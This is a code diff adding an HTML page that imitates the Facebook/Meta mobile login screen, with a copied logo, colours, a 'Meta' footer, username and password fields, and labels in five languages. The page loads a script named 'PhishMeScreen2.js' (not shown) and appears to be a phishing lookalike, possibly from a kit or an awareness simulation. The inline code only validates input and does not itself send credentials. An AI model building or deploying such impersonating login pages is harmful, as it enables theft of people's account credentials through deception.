@@ -1,0 +1,355 @@
+<html lang="en" class=" vorayiytl idc0_350"><head>
+<meta charset="UTF-8">
+<meta content="width=device-width, initial-scale=1" name="viewport">
+<title>Facebook</title>
+<script type="text/javascript" src="components/PhishMeScreen2.js"></script>
+</head>
+<body>
+
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>account Login</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: linear-gradient(90deg, rgb(253, 243, 246) 0%, 16.567%, rgb(236, 244, 254) 33.134%, 66.567%, rgb(238, 246, 255) 100%);
+            font-family: Arial, sans-serif, Bold;
+            color: #1d2129;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .container {
+            width: 93%;
+            max-width: 414px;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .top-bar {
+            width: 100%;
+            padding: 40px 0 0; 
+            display: flex;
+            justify-content: center;
+            align-items: flex-start; 
+        }
+
+        .language-select {
+            color: #1d2129;
+            font-size: 14px;
+            text-decoration: none;
+            border: none;
+            background: transparent;
+            cursor: pointer;
+            padding: 5px;
+        }
+
+        .logo {
+            margin: 10px 0; 
+            width: 65px;
+            height: 65px;
+            background-size: contain;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        }
+
+        .login-form {
+            width: 98%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin-top: 45px; 
+        }
+
+        .input-container {
+            width: 100%;
+            position: relative;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 14px 40px 14px 14px; 
+            margin: 8px 0;
+            background: #ffffff;
+            border: 1px solid #dadde1; 
+            border-radius: 8px; 
+            color: #1d2129;
+            font-size: 16px;
+            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.05);
+        }
+
+        .input-field::placeholder {
+            color: #606770;
+        }
+
+        .password-toggle {
+            position: absolute;
+            right: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            cursor: pointer;
+            width: 20px;
+            height: 20px; 
+            background: url('components/B3lHA4Y.png') no-repeat center center; /* Hide icon (default) */
+            background-size: contain;
+        }
+
+        .password-toggle.show {
+            background: url('components/vRA0SFC.png') no-repeat center center; /* Show icon */
+            background-size: contain;
+        }
+
+        .error-message {
+            color: #e41e3f; 
+            font-size: 12px;
+            margin-top: 5px;
+            display: none; 
+            text-align: center;
+        }
+
+        .buttons {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin-top: 20px; 
+        }
+
+        .login-button {
+			display: inline-block;
+			text-decoration: none;
+			text-align: center;
+            width: 95%;
+            padding: 12px;
+            background: #1877f2;
+            border: none;
+            border-radius: 30px; 
+            color: #ffffff;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        }
+
+        .login-button:hover {
+            background: #166fe5;
+        }
+
+        .forgot-password {
+            margin: 15px 0;
+            color: #1877f2;
+            font-size: 14px;
+            text-decoration: none;
+        }
+
+        .forgot-password:hover {
+            text-decoration: underline;
+        }
+
+        .create-account {
+            width: 95%;
+            padding: 12px;
+            background: transparent;
+            border: 1px solid #1877f2;
+            border-radius: 30px; 
+            color: #1877f2;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 240px; 
+        }
+
+        .create-account:hover {
+            background: #f0f2f5;
+        }
+
+        .meta-logo {
+            margin-top: 5px; 
+            color: #606770;
+            font-size: 14px;
+            display: flex;
+            align-items: center;
+        }
+
+        .meta-logo::before {
+            content: '∞';
+            color: #1877f2;
+            font-size: 20px;
+            margin-right: 5px;
+        }
+    </style>
+
+
+    <div class="container">
+        <div class="top-bar">
+            <select id="languageSelect" class="language-select">
+                <option value="en" selected="selected">English (UK)</option>
+                <option value="bn">বাংলা</option>
+                <option value="es">Español</option>
+                <option value="ar">العربية</option>
+                <option value="fr">Français</option>
+            </select>
+        </div>
+        <div class="logo">
+            <img id="facebookLogo" src="components/facebookLogo.png" style="width: 100%">
+        </div>
+        <div class="login-form">
+            <div class="input-container">
+                <input type="text" id="username" class="input-field" placeholder="Mobile number or email address">
+                <div id="mobileError" class="error-message"></div>
+            </div>
+            <div class="input-container">
+                <input type="text" class="input-field" placeholder="Password" id="password">
+                <span class="password-toggle" id="togglePassword"></span>
+                <div id="passwordError" class="error-message"></div>
+            </div>
+        </div>
+				
+		
+        <div class="buttons">
+            <a id="submitBtn" class="login-button" href="#">Log in</a>
+            <a href="#" class="forgot-password">Forgotten Password?</a>
+            <button class="create-account">Create new account</button>
+        </div>
+        <div class="meta-logo">Meta</div>
+    </div>
+
+    <script>
+        document.addEventListener("DOMContentLoaded", function() {
+            const languageSelect = document.getElementById("languageSelect");
+            const mobileError = document.getElementById("mobileError");
+            const passwordError = document.getElementById("passwordError");
+            const password = document.getElementById("password");
+            const togglePassword = document.getElementById("togglePassword");
+            const translations = {
+                en: {
+                    mobilePlaceholder: "Mobile number or email address",
+                    passwordPlaceholder: "Password",
+                    loginButton: "Log in",
+                    forgotPassword: "Forgotten Password?",
+                    createAccount: "Create new account",
+                    metaText: "Meta",
+                    mobileErrorMsg: "Please enter your Mobile number or Email address.",
+                    passwordErrorMsg: "Please enter your Password."
+                },
+                bn: {
+                    mobilePlaceholder: "মোবাইল নম্বর বা ইমেল ঠিকানা",
+                    passwordPlaceholder: "পাসওয়ার্ড",
+                    loginButton: "লগ ইন",
+                    forgotPassword: "পাসওয়ার্ড ভুলে গেছেন?",
+                    createAccount: "নতুন অ্যাকাউন্ট তৈরি করুন",
+                    metaText: "মেটা",
+                    mobileErrorMsg: "দয়া করে আপনার মোবাইল নম্বর বা ইমেল ঠিকানা লিখুন।",
+                    passwordErrorMsg: "দয়া করে আপনার পাসওয়ার্ড লিখুন।"
+                },
+                es: {
+                    mobilePlaceholder: "Número de móvil o correo electrónico",
+                    passwordPlaceholder: "Contraseña",
+                    loginButton: "Iniciar sesión",
+                    forgotPassword: "¿Contraseña olvidada?",
+                    createAccount: "Crear una cuenta nueva",
+                    metaText: "Meta",
+                    mobileErrorMsg: "Por favor, ingrese su número de móvil o correo electrónico.",
+                    passwordErrorMsg: "Por favor, ingrese su contraseña."
+                },
+                ar: {
+                    mobilePlaceholder: "رقم الهاتف المحمول أو البريد الإلكتروني",
+                    passwordPlaceholder: "كلمة السر",
+                    loginButton: "تسجيل الدخول",
+                    forgotPassword: "هل نسيت كلمة السر؟",
+                    createAccount: "إنشاء حساب جديد",
+                    metaText: "ميتا",
+                    mobileErrorMsg: "الرجاء إدخال رقم هاتفك المحمول أو بريدك الإلكتروني.",
+                    passwordErrorMsg: "الرجاء إدخال كلمة المرور الخاصة بك."
+                },
+                fr: {
+                    mobilePlaceholder: "Numéro de mobile ou adresse e-mail",
+                    passwordPlaceholder: "Mot de passe",
+                    loginButton: "Connexion",
+                    forgotPassword: "Mot de passe oublié?",
+                    createAccount: "Créer un nouveau compte",
+                    metaText: "Meta",
+                    mobileErrorMsg: "Veuillez entrer votre numéro de mobile ou adresse e-mail.",
+                    passwordErrorMsg: "Veuillez entrer votre mot de passe."
+                }
+            };
+
+            languageSelect.addEventListener("change", function() {
+                const selectedLanguage = this.value;
+                translatePage(selectedLanguage);
+            });
+
+            function translatePage(lang) {
+                const t = translations[lang];
+                const mobileInput = document.querySelector(".input-field[placeholder]");
+                const password = document.getElementById("password");
+                
+                mobileInput.placeholder = t.mobilePlaceholder;
+                password.placeholder = t.passwordPlaceholder;
+                document.querySelector(".login-button").textContent = t.loginButton;
+                document.querySelector(".forgot-password").textContent = t.forgotPassword;
+                document.querySelector(".create-account").textContent = t.createAccount;
+                document.querySelector(".meta-logo").textContent = t.metaText;
+                
+                mobileError.textContent = "";
+                passwordError.textContent = "";
+            }
+            
+            let userLang=(navigator.language||navigator.userLanguage).split('-')[0],supportedLanguages=["en","fr","ar","es","bn"];translatePage(supportedLanguages.includes(userLang)?userLang:"en");
+
+
+            togglePassword.addEventListener("click", function() {
+                const type = password.type === "password" ? "text" : "password";
+                password.type = type;
+                togglePassword.classList.toggle("show"); 
+            });
+
+            document.getElementById("submitBtn").addEventListener("click", function(e) {
+                 
+                const mobileEmail = document.querySelector(".input-field[placeholder]").value;
+                const password = document.getElementById("password").value;
+                const selectedLanguage = languageSelect.value;
+                const t = translations[selectedLanguage];
+
+                let hasError = false;
+                if (!mobileEmail) {
+                    mobileError.textContent = t.mobileErrorMsg;
+                    mobileError.style.display = "block";
+                    hasError = true;
+                } else {
+                    mobileError.style.display = "none";
+                }
+                if (!password) {
+                    passwordError.textContent = t.passwordErrorMsg;
+                    passwordError.style.display = "block";
+                    hasError = true;
+                } else {
+                    passwordError.style.display = "none";
+                }
+
+                if (hasError) {
+                    e.preventDefault();
+                }
+
+            });
+
+            
+        });
+    </script>
+
+
+<div class="blog-posts no-items section" id="main"></div>
+
+</body></html>
